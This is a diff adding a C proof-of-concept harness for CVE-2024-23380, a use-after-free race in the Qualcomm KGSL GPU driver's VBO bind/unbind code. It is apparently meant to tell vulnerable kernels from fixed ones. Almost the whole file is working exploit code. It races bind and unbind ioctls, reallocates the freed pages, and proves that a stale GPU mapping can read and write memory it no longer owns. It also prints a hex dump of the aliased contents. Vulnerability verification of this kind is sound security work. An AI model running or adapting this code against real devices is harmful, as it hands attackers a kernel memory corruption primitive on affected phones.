@@ -1,0 +1,642 @@
+// SPDX-License-Identifier: GPL-2.0-only
+/*
+ * CVE-2024-23380 harness -- KGSL VBO bind/unbind use-after-free (CWE-416).
+ *
+ * THE BUG
+ * -------
+ * kgsl_memdesc_add_range() in drivers/gpu/msm/kgsl_vbo.c used to install the
+ * GPU mapping *after* dropping memdesc->ranges_lock:
+ *
+ *	mutex_lock(&memdesc->ranges_lock);
+ *	...
+ *	interval_tree_insert(&range->range, &memdesc->ranges);
+ *	mutex_unlock(&memdesc->ranges_lock);              <-- lock released
+ *
+ *	return kgsl_mmu_map_child(memdesc->pagetable, memdesc, start,
+ *			&entry->memdesc, offset, last - start + 1);  <-- outside
+ *
+ * The interval tree is what ties a live page-table entry to a reference on
+ * the child memdesc.  A concurrent kgsl_memdesc_remove_range() can therefore
+ * slip in between the unlock and the map: it finds the just-inserted range,
+ * unmaps it, drops the child reference (kgsl_mem_entry_put) and frees the
+ * range object.  The bind then goes on to install a PTE that no range in the
+ * tree accounts for.
+ *
+ * The invariant that is broken is
+ *
+ *	every PTE in a VBO range is backed by an interval-tree range, and
+ *	hence by a reference that keeps the child memdesc alive.
+ *
+ * When the child is later freed, its physical pages go back to the page
+ * allocator, but the VBO's PTE still points at them.  Any later allocation
+ * that receives those pages becomes aliased by the VBO.  That is the
+ * use-after-free: the VBO keeps a live reference to storage whose owning
+ * memdesc is gone, and it dereferences whatever the reallocator put there.
+ *
+ * The upstream fix (44158877) moves kgsl_mmu_map_child() inside the lock,
+ * before the insert, restoring the invariant.  It touches no other file.
+ *
+ * WHAT THIS HARNESS DOES
+ * ----------------------
+ *  1. proves the GPU read/write path works at all (baseline), so a later
+ *     failure is unambiguously about the race and not about plumbing;
+ *  2. creates the bind/unbind interleaving repeatedly and detects the UAF by
+ *     its oracle -- after freeing the child and reallocating its pages as a
+ *     placeholder, a read of the VBO returns the placeholder's byte, not the
+ *     child's and not zero;
+ *  3. reports a single verdict, so the same binary run against the vulnerable
+ *     and the fixed kernel gives a differential result.
+ *
+ * ORACLE
+ * ------
+ *   child pages are filled with 0x41 ('A')
+ *   placeholder pages are filled with 0x44 ('D')
+ *   a read of the VBO that yields 0x44444444 proves the VBO is aliasing
+ *   storage it no longer owns.  0x41414141 means the bind won cleanly and
+ *   the mapping is intact; 0 means the range was cleanly unmapped to the
+ *   zero page.
+ */
+
+#include "kgsl_lab.h"
+
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdatomic.h>
+#include <sys/wait.h>
+#include <time.h>
+
+#define LAB_CPU_MAP_FLAGS (KGSL_MEMFLAGS_USE_CPU_MAP | \
+	KGSL_MEMFLAGS_IOCOHERENT | \
+	(KGSL_CACHEMODE_WRITEBACK << KGSL_CACHEMODE_SHIFT))
+
+/* ------------------------------------------------------------------ */
+/* Tunables                                                           */
+/* ------------------------------------------------------------------ */
+/*
+ * Defaults are sized for stock qemu-system-aarch64 under TCG, where a guest
+ * millisecond is far slower than on a device and the memory budget is a few
+ * hundred megabytes rather than several gigabytes.  Every one of them is an
+ * environment variable so a run can be retuned without recompiling.
+ */
+
+static unsigned int tun_attempts;
+static unsigned int tun_start_delay_us;
+static unsigned int tun_settle_ms;
+static unsigned int tun_uaf_pages;
+static unsigned int tun_placeholders;
+static unsigned int tun_payload_size;
+static unsigned int tun_result_off;
+static unsigned int tun_verbose;
+static unsigned int tun_dump;
+static unsigned int tun_ranges;
+
+static uint32_t vbo_size;		/* derived: tun_uaf_pages * PAGE_SIZE */
+
+static unsigned int env_u(const char *name, unsigned int dflt)
+{
+	const char *s = getenv(name);
+	unsigned long v;
+
+	if (!s || !*s)
+		return dflt;
+	v = strtoul(s, NULL, 0);
+	return v ? (unsigned int)v : dflt;
+}
+
+static void tunables_init(void)
+{
+	tun_attempts		= env_u("LAB_ATTEMPTS", 64);
+	tun_start_delay_us	= env_u("LAB_START_DELAY_US", 1000);
+	tun_settle_ms		= env_u("LAB_SETTLE_MS", 300);
+	tun_uaf_pages		= env_u("LAB_UAF_PAGES", 0x30);
+	tun_placeholders	= env_u("LAB_PLACEHOLDERS", 8);
+	tun_payload_size	= env_u("LAB_PAYLOAD_SIZE", 0x40000);
+	tun_result_off		= env_u("LAB_RESULT_OFF", 0x8000);
+	tun_verbose		= env_u("LAB_VERBOSE", 0);
+	tun_dump		= env_u("LAB_DUMP", 1);
+	tun_ranges		= env_u("LAB_RANGES", 1);
+
+	/* The command stream and the read-back window both live in the
+	 * payload allocation and must not overlap.  Results go high, the
+	 * command stream low.
+	 */
+	if (tun_result_off < 0x1000)
+		lab_err("LAB_RESULT_OFF=0x%x is too small for the IB",
+			tun_result_off);
+	if (tun_payload_size <= tun_result_off)
+		lab_err("LAB_PAYLOAD_SIZE=0x%x must exceed "
+			"LAB_RESULT_OFF=0x%x", tun_payload_size,
+			tun_result_off);
+	if (tun_result_off + 0x1000 > tun_payload_size)
+		lab_err("LAB_RESULT_OFF=0x%x leaves no room for a page "
+			"read-back window", tun_result_off);
+	if (tun_result_off + 0x2000 > tun_payload_size)
+		lab_err("LAB_RESULT_OFF=0x%x leaves no room for the scratch "
+			"page", tun_result_off);
+
+	vbo_size = tun_uaf_pages * PAGE_SIZE;
+	if (tun_uaf_pages && vbo_size / PAGE_SIZE != tun_uaf_pages)
+		lab_err("LAB_UAF_PAGES=0x%x overflows", tun_uaf_pages);
+	if (!tun_ranges || tun_ranges > tun_uaf_pages ||
+	    vbo_size % (tun_ranges * PAGE_SIZE))
+		lab_err("LAB_RANGES=%u must divide LAB_UAF_PAGES=0x%x",
+			tun_ranges, tun_uaf_pages);
+}
+
+#define T_ATTEMPTS		tun_attempts
+#define T_START_DELAY_US	tun_start_delay_us
+#define T_SETTLE_MS		tun_settle_ms
+#define T_PLACEHOLDERS		tun_placeholders
+#define T_PAYLOAD_SIZE		tun_payload_size
+#define T_RESULT_OFF		tun_result_off
+/* A dedicated page for write-then-read verification, distinct from the
+ * poisoned result window.  The backend's read helper poisons its destination
+ * (the result window) before copying, so a write/read round trip must not use
+ * the result window as its own source or the poison would clobber the value.
+ */
+#define T_SCRATCH_OFF		(tun_result_off + 0x1000)
+#define T_VERBOSE		tun_verbose
+#define T_DUMP			tun_dump
+#define T_RANGES		tun_ranges
+#define T_RANGE_SIZE		(vbo_size / T_RANGES)
+
+#define CHILD_BYTE	0x41u	/* 'A' */
+#define PLACEHOLDER_BYTE 0x44u	/* 'D' */
+
+static void msleep(unsigned int ms)
+{
+	struct timespec ts = {
+		.tv_sec = ms / 1000,
+		.tv_nsec = (long)(ms % 1000) * 1000000L,
+	};
+
+	while (nanosleep(&ts, &ts) == -1 && errno == EINTR)
+		;
+}
+
+/* ------------------------------------------------------------------ */
+/* GPU-side memory access                                             */
+/* ------------------------------------------------------------------ */
+
+struct gpubuf {
+	int fd;
+	uint32_t ctx;
+	uint64_t gpuaddr;
+	char *host;		/* mmap of the payload allocation */
+	uint32_t *cmds;		/* IB staging, inside the allocation */
+	size_t cmds_size;
+};
+
+/*
+ * Read `len` bytes from GPU address `src` into the result window of the
+ * payload allocation.  Returns the bytes via the host mapping once the
+ * command has been submitted and retired.
+ */
+static void gpu_read(struct gpubuf *gb, uint64_t src, size_t len)
+{
+	uint32_t *c = gb->cmds;
+
+	/* Poison the destination so a silent no-op is visible. */
+	memset(gb->host + T_RESULT_OFF, 0xcc, len);
+
+	if (len > 0x7ff8)
+		lab_err("gpu_read: len %zu too large", len);
+
+	c = emit_gpu_memcpy(c, gb->gpuaddr + T_RESULT_OFF, src, len);
+	c = emit_fence(c);
+
+	kgsl_gpu_command(gb->fd, gb->ctx, gb->gpuaddr,
+			 (unsigned int)((c - gb->cmds) * sizeof(uint32_t)));
+}
+
+static uint32_t gpu_read32(struct gpubuf *gb, uint64_t src)
+{
+	gpu_read(gb, src, 4);
+	uint32_t v;
+
+	memcpy(&v, gb->host + T_RESULT_OFF, sizeof(v));
+	return v;
+}
+
+static void gpu_write32(struct gpubuf *gb, uint64_t dst, uint32_t val)
+{
+	uint32_t *c = gb->cmds;
+	uint32_t data = val;
+
+	c = emit_gpu_memwrite(c, dst, &data, sizeof(data));
+	c = emit_fence(c);
+
+	kgsl_gpu_command(gb->fd, gb->ctx, gb->gpuaddr,
+			 (unsigned int)((c - gb->cmds) * sizeof(uint32_t)));
+}
+
+/* ------------------------------------------------------------------ */
+/* Baseline                                                           */
+/* ------------------------------------------------------------------ */
+/*
+ * Before racing anything, establish that the whole path works: allocate a
+ * GPU-mapped buffer, write a value through the backend, read it back, and
+ * bind a child into a VBO and read the child's contents.  A clean baseline
+ * is what lets a failed race run be read as "the race did not land" rather
+ * than "the harness is broken".
+ */
+static int run_baseline(int fd, struct gpubuf *gb)
+{
+	uint64_t child_id;
+	char *child;
+	uint64_t vbo_id, vbo_addr;
+	struct kgsl_gpumem_bind_range range;
+	struct kgsl_gpumem_bind_ranges bind_arg;
+	uint32_t v;
+
+	printf("[0] baseline\n");
+
+	/* Round-trip through the backend.  Write to the scratch page, then read
+	 * it back into the (poisoned) result window.  Reading from the result
+	 * window itself would let the poison overwrite the value under test.
+	 */
+	gpu_write32(gb, gb->gpuaddr + T_SCRATCH_OFF, 0x5a5a5a5au);
+	v = gpu_read32(gb, gb->gpuaddr + T_SCRATCH_OFF);
+	if (v != 0x5a5a5a5au) {
+		printf("    FAIL: GPU write/read round trip returned 0x%08x\n", v);
+		return -1;
+	}
+	printf("    ok: GPU write/read round trip\n");
+
+	/* A VBO must be allocatable at all; both VBO feature gates have to be
+	 * satisfied by the device tree for this to succeed.
+	 */
+	vbo_id = kgsl_gpuobj_alloc(fd, vbo_size, KGSL_MEMFLAGS_VBO);
+	if (!vbo_id) {
+		printf("    FAIL: GPUOBJ_ALLOC with KGSL_MEMFLAGS_VBO returned id 0\n");
+		return -1;
+	}
+	vbo_addr = kgsl_gpuobj_gpuaddr(fd, (unsigned int)vbo_id);
+	printf("    ok: VBO id=0x%lx gpuaddr=0x%lx\n", vbo_id, vbo_addr);
+	kgsl_gpumem_free(fd, (unsigned int)vbo_id);
+
+	/* Bind a child and read it through the VBO. */
+	child_id = kgsl_gpuobj_alloc(fd, vbo_size, LAB_CPU_MAP_FLAGS);
+	child = mmap(NULL, vbo_size, PROT_READ | PROT_WRITE, MAP_SHARED,
+		     fd, (off_t)(child_id * PAGE_SIZE));
+	if (child == MAP_FAILED)
+		lab_err("mmap child: %s", strerror(errno));
+	memset(child, CHILD_BYTE, vbo_size);
+
+	vbo_id = kgsl_gpuobj_alloc(fd, vbo_size, KGSL_MEMFLAGS_VBO);
+	if (!vbo_id) {
+		printf("    FAIL: baseline VBO allocation returned id 0\n");
+		munmap(child, vbo_size);
+		kgsl_gpumem_free(fd, (unsigned int)child_id);
+		return -1;
+	}
+	vbo_addr = kgsl_gpuobj_gpuaddr(fd, (unsigned int)vbo_id);
+
+	memset(&range, 0, sizeof(range));
+	range.child_offset = 0;
+	range.target_offset = 0;
+	range.length = vbo_size;
+	range.child_id = (uint32_t)child_id;
+	range.op = KGSL_GPUMEM_RANGE_OP_BIND;
+
+	memset(&bind_arg, 0, sizeof(bind_arg));
+	bind_arg.ranges = (uint64_t)(uintptr_t)&range;
+	bind_arg.ranges_nents = 1;
+	bind_arg.ranges_size = sizeof(range);
+	bind_arg.id = (uint32_t)vbo_id;
+	bind_arg.flags = 0;
+
+	LAB_IOCTL(fd, IOCTL_KGSL_GPUMEM_BIND_RANGES, &bind_arg);
+	msleep(T_SETTLE_MS);
+
+	v = gpu_read32(gb, vbo_addr);
+	if (v != (CHILD_BYTE * 0x01010101u)) {
+		printf("    FAIL: clean VBO read returned 0x%08x, expected 0x%08x\n",
+		       v, CHILD_BYTE * 0x01010101u);
+		return -1;
+	}
+	printf("    ok: clean VBO bind/read (0x%08x)\n", v);
+
+	munmap(child, vbo_size);
+	kgsl_gpumem_free(fd, (unsigned int)child_id);
+	kgsl_gpumem_free(fd, (unsigned int)vbo_id);
+	return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* The race                                                           */
+/* ------------------------------------------------------------------ */
+
+struct race_ctx {
+	int fd;
+	uint64_t vbo_id;
+	uint64_t child_id;
+	atomic_int gate;		/* 0: hold, 1: both threads fire */
+	atomic_int unbind_issued;
+};
+
+static struct kgsl_gpumem_bind_range *make_ranges(uint32_t child_id,
+		uint32_t op)
+{
+	struct kgsl_gpumem_bind_range *ranges;
+	unsigned int i;
+
+	ranges = calloc(T_RANGES, sizeof(*ranges));
+	if (!ranges)
+		lab_err("calloc ranges");
+	for (i = 0; i < T_RANGES; i++) {
+		ranges[i].target_offset = i * T_RANGE_SIZE;
+		ranges[i].length = T_RANGE_SIZE;
+		ranges[i].child_id = child_id;
+		ranges[i].op = op;
+		/* The kernel rejects a non-zero child_offset on unbind
+		 * (kgsl_vbo.c): for unbind, child_offset must be 0.  A bind
+		 * maps child_offset..+length onto the same target window, so
+		 * each range's child offset tracks its target offset.
+		 */
+		ranges[i].child_offset = (op == KGSL_GPUMEM_RANGE_OP_UNBIND) ?
+			0 : i * T_RANGE_SIZE;
+	}
+	return ranges;
+}
+
+static void do_bind(struct race_ctx *rc)
+{
+	struct kgsl_gpumem_bind_range *ranges;
+	struct kgsl_gpumem_bind_ranges arg;
+
+	ranges = make_ranges((uint32_t)rc->child_id,
+			KGSL_GPUMEM_RANGE_OP_BIND);
+	memset(&arg, 0, sizeof(arg));
+	arg.ranges = (uint64_t)(uintptr_t)ranges;
+	arg.ranges_nents = T_RANGES;
+	arg.ranges_size = sizeof(*ranges);
+	arg.id = (uint32_t)rc->vbo_id;
+	arg.flags = 0;
+
+	LAB_IOCTL(rc->fd, IOCTL_KGSL_GPUMEM_BIND_RANGES, &arg);
+	free(ranges);
+}
+
+static void do_unbind(struct race_ctx *rc)
+{
+	struct kgsl_gpumem_bind_range *ranges;
+	struct kgsl_gpumem_bind_ranges arg;
+
+	ranges = make_ranges((uint32_t)rc->child_id,
+			KGSL_GPUMEM_RANGE_OP_UNBIND);
+	memset(&arg, 0, sizeof(arg));
+	arg.ranges = (uint64_t)(uintptr_t)ranges;
+	arg.ranges_nents = T_RANGES;
+	arg.ranges_size = sizeof(*ranges);
+	arg.id = (uint32_t)rc->vbo_id;
+	arg.flags = 0;
+
+	LAB_IOCTL(rc->fd, IOCTL_KGSL_GPUMEM_BIND_RANGES, &arg);
+	free(ranges);
+	atomic_store(&rc->unbind_issued, 1);
+}
+
+static void *unbind_thread(void *argp)
+{
+	struct race_ctx *rc = argp;
+
+	/*
+	 * Spin on the gate.  This is what makes the two ioctls land close
+	 * together: the driver defers the actual work to schedule_work(), so
+	 * what matters is when the two work items are queued, and the two
+	 * workers then run concurrently on different CPUs.
+	 */
+	while (!atomic_load_explicit(&rc->gate, memory_order_acquire))
+		sched_yield();
+
+	do_unbind(rc);
+	return NULL;
+}
+
+/*
+ * One attempt at the race.  Returns 1 if the UAF oracle fired, 0 otherwise.
+ *
+ * Each of the T_PLACEHOLDERS placeholders is a fresh allocation of the
+ * child's size.  Whether the allocator hands back the *exact* physical
+ * pages the child used is probabilistic, so several are tried; that is why
+ * the reference PoC keeps a small array of them.
+ */
+static int attempt_uaf(int fd, struct gpubuf *gb, unsigned int idx,
+		unsigned int *writes)
+{
+	struct race_ctx rc;
+	pthread_t tid;
+	uint64_t vbo_id, vbo_addr, child_id;
+	char *child;
+	int hit = 0;
+
+	vbo_id = kgsl_gpuobj_alloc(fd, vbo_size, KGSL_MEMFLAGS_VBO);
+	if (!vbo_id) {
+		printf("    FAIL: race VBO allocation returned id 0\n");
+		return -1;
+	}
+	vbo_addr = kgsl_gpuobj_gpuaddr(fd, (unsigned int)vbo_id);
+
+	child_id = kgsl_gpuobj_alloc(fd, vbo_size, LAB_CPU_MAP_FLAGS);
+	if (!child_id) {
+		printf("    FAIL: race child allocation returned id 0\n");
+		kgsl_gpumem_free(fd, (unsigned int)vbo_id);
+		return -1;
+	}
+	child = mmap(NULL, vbo_size, PROT_READ | PROT_WRITE, MAP_SHARED,
+		     fd, (off_t)(child_id * PAGE_SIZE));
+	if (child == MAP_FAILED)
+		lab_err("mmap child: %s", strerror(errno));
+	memset(child, CHILD_BYTE, vbo_size);
+
+	rc.fd = fd;
+	rc.vbo_id = vbo_id;
+	rc.child_id = child_id;
+	atomic_init(&rc.gate, 0);
+	atomic_init(&rc.unbind_issued, 0);
+
+	if (pthread_create(&tid, NULL, unbind_thread, &rc) != 0)
+		lab_err("pthread_create");
+
+	/* Let the unbind thread reach its spin, then release both at once. */
+	msleep(T_START_DELAY_US / 1000 ? T_START_DELAY_US / 1000 : 1);
+	if (T_START_DELAY_US % 1000)
+		usleep(T_START_DELAY_US % 1000);
+
+	atomic_store_explicit(&rc.gate, 1, memory_order_release);
+	do_bind(&rc);
+	pthread_join(tid, NULL);
+
+	/* Both ioctls have returned; the work items are queued.  Let them run.
+	 * Keeping this generous means we normally exercise the "mapping
+	 * outlives the range" outcome rather than freeing the child out from
+	 * under an in-flight map_child().
+	 */
+	msleep(T_SETTLE_MS);
+
+	/* Release the child.  Its pages return to the page allocator; the VBO's
+	 * PTE, if the race landed, still points at them.
+	 */
+	munmap(child, vbo_size);
+	kgsl_gpumem_free(fd, (unsigned int)child_id);
+
+	for (unsigned int p = 0; p < T_PLACEHOLDERS && !hit; p++) {
+		uint64_t ph_id, ph_addr;
+		char *ph;
+		uint32_t v;
+
+		ph_id = kgsl_gpuobj_alloc(fd, vbo_size, LAB_CPU_MAP_FLAGS);
+		ph = mmap(NULL, vbo_size, PROT_READ | PROT_WRITE, MAP_SHARED,
+			  fd, (off_t)(ph_id * PAGE_SIZE));
+		if (ph == MAP_FAILED) {
+			kgsl_gpumem_free(fd, (unsigned int)ph_id);
+			continue;
+		}
+		memset(ph, PLACEHOLDER_BYTE, vbo_size);
+		ph_addr = kgsl_gpuobj_gpuaddr(fd, (unsigned int)ph_id);
+
+		for (unsigned int r = 0; r < T_RANGES && !hit; r++) {
+			uint64_t probe = vbo_addr + r * T_RANGE_SIZE;
+
+			v = gpu_read32(gb, probe);
+			if (T_VERBOSE)
+				printf("    attempt %u placeholder %u range %u: "
+				       "vbo=0x%08x placeholder=0x%lx\n",
+				       idx, p, r, v, ph_addr);
+
+			if (v == PLACEHOLDER_BYTE * 0x01010101u) {
+				uint64_t off = (uint64_t)r * T_RANGE_SIZE;
+				uint32_t marker = 0xcafebabeu;
+				uint32_t back;
+
+				hit = 1;
+				printf("[+] UAF  attempt=%u placeholder=%u range=%u  "
+				       "VBO 0x%lx reads 0x%08x (placeholder 0x%lx)\n",
+				       idx, p, r, probe, v, ph_addr);
+
+				/*
+				 * Escalation gate: the read above proves the VBO's
+				 * stale PTE aliases the reallocated page.  Now prove
+				 * it is also a *write* primitive: a GPU write to the
+				 * same VBO address must land in the placeholder's
+				 * user mapping (both alias the same physical page).
+				 */
+				gpu_write32(gb, probe, marker);
+				memcpy(&back, ph + off, sizeof(back));
+				if (back == marker) {
+					(*writes)++;
+					printf("[+] WRITE  VBO 0x%lx -> placeholder"
+					       " offset 0x%llx = 0x%08x\n",
+					       probe, (unsigned long long)off, back);
+				} else {
+					printf("[-] write-through failed: placeholder"
+					       " has 0x%08x, expected 0x%08x\n",
+					       back, marker);
+				}
+
+				/* Report the whole aliased range, not just word 0. */
+				gpu_read(gb, probe, PAGE_SIZE);
+				if (T_DUMP) {
+					printf("    --- aliased contents of the VBO ---\n");
+					hexdump(gb->host + T_RESULT_OFF, 0x100);
+				}
+			}
+		}
+
+		munmap(ph, vbo_size);
+		kgsl_gpumem_free(fd, (unsigned int)ph_id);
+	}
+
+	kgsl_gpumem_free(fd, (unsigned int)vbo_id);
+	return hit;
+}
+
+/* ------------------------------------------------------------------ */
+
+int main(int argc, char **argv)
+{
+	int fd;
+	struct gpubuf gb;
+	uint64_t payload_gpuaddr;
+	uint32_t ctx;
+	int hits = 0;
+	unsigned int writes = 0;
+
+	setvbuf(stdout, NULL, _IONBF, 0);
+	setvbuf(stderr, NULL, _IONBF, 0);
+	tunables_init();
+
+	printf("===============================================================\n");
+	printf(" CVE-2024-23380  KGSL VBO bind UAF  (CWE-416)\n");
+	printf("===============================================================\n");
+	printf(" tunables: attempts=%u uaf_pages=%u start_delay_us=%u "
+	       "settle_ms=%u placeholders=%u ranges=%u\n",
+	       T_ATTEMPTS, tun_uaf_pages, T_START_DELAY_US, T_SETTLE_MS,
+	       T_PLACEHOLDERS, T_RANGES);
+	printf(" uid=%u gid=%u euid=%u\n",
+	       (unsigned)getuid(), (unsigned)getgid(), (unsigned)geteuid());
+
+	fd = open(LAB_KGSL_DEV, O_RDWR);
+	if (fd < 0)
+		lab_err("open %s: %s", LAB_KGSL_DEV, strerror(errno));
+	printf("[+] opened %s\n", LAB_KGSL_DEV);
+
+	payload_gpuaddr = kgsl_gpumem_alloc(fd, T_PAYLOAD_SIZE,
+					    KGSL_MEMFLAGS_USE_CPU_MAP |
+					    KGSL_MEMFLAGS_IOCOHERENT |
+					    (KGSL_CACHEMODE_WRITEBACK <<
+					     KGSL_CACHEMODE_SHIFT) |
+					    (KGSL_MEMALIGN_SHIFT << 0));
+	ctx = kgsl_drawctxt_create(fd, 1u << KGSL_CONTEXT_PRIORITY_SHIFT);
+
+	gb.fd = fd;
+	gb.ctx = ctx;
+	gb.gpuaddr = payload_gpuaddr;
+	/* KGSL's mmap offset is the GPU address itself, not a byte-scaled ID. */
+	gb.host = mmap(NULL, T_PAYLOAD_SIZE, PROT_READ | PROT_WRITE,
+		       MAP_SHARED, fd, (off_t)payload_gpuaddr);
+	if (gb.host == MAP_FAILED)
+		lab_err("mmap payload: %s", strerror(errno));
+
+	/* IBs are submitted as GPU addresses, so the command stream has to live
+	 * inside the GPU-mapped allocation too.
+	 */
+	gb.cmds = (uint32_t *)(void *)(gb.host);
+	gb.cmds_size = T_RESULT_OFF / sizeof(uint32_t);
+
+	if (run_baseline(fd, &gb) != 0) {
+		printf("\n=== BASELINE FAILED -- results below would be "
+		       "meaningless ===\n");
+		return 2;
+	}
+
+	printf("[1] racing bind against unbind\n");
+	for (unsigned int i = 0; i < T_ATTEMPTS; i++) {
+		int rc = attempt_uaf(fd, &gb, i, &writes);
+
+		if (rc < 0)
+			return 3;
+		if (rc)
+			hits++;
+	}
+
+	printf("\n===============================================================\n");
+	printf(" attempts: %u   UAF hits: %u   write-through hits: %u\n",
+	       T_ATTEMPTS, hits, writes);
+	if (hits)
+		printf(" VERDICT: VULNERABLE -- a VBO range outlived its "
+		       "interval-tree range and aliases reallocated storage"
+		       " (%u/%u write-through)\n", writes, hits);
+	else
+		printf(" VERDICT: NO UAF OBSERVED in %u attempts "
+		       "(expected on a fixed kernel; on a vulnerable kernel, "
+		       "increase attempts and sweep LAB_START_DELAY_US)\n",
+		       T_ATTEMPTS);
+	printf("===============================================================\n");
+
+	(void)argc;
+	(void)argv;
+	return hits ? 0 : 1;
+}
